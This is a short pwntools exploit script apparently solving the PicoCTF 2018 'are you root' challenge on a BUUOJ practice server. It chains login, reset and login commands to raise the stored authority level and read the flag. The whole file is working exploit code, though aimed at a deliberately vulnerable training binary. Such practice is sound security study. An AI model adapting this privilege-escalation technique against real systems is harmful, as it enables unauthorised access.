from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('PicoCTF_2018_are_you_root')
io = remote('node4.buuoj.cn', 28219)
# libc = ELF('/home/payoung/Downloads/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')
# libc = ELF('libc-2.27.so')
elf = ELF('PicoCTF_2018_are_you_root')


io.sendlineafter('> ', b'login ' + cyclic(8) + p8(5))
io.sendlineafter('> ', b'reset')
io.sendlineafter('> ', b'login ' + cyclic(8))
io.sendlineafter('> ', b'get-flag')
io.recv()
